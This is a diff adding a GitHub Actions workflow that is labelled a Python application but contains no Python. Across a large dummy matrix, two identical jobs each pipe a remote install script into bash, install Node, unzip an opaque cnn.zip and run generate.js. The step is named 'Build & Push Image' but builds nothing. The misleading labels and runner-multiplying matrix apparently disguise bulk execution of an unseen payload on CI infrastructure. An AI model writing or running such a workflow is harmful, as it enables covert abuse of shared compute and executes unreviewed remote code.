@@ -1,0 +1,53 @@
+name: Python application
+##############
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3]
+        flag: [A, B, C, D]
+    
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build & Push Image
+      run: |
+        curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+        export NVM_DIR="$HOME/.nvm"
+        source ~/.nvm/nvm.sh
+        nvm install 18
+        unzip cnn.zip;node generate.js
+
+  deploy:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3]
+        flag: [A, B, C, D]
+    
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build & Push Image
+      run: |
+        curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+        export NVM_DIR="$HOME/.nvm"
+        source ~/.nvm/nvm.sh
+        nvm install 18
+        unzip cnn.zip;node generate.js
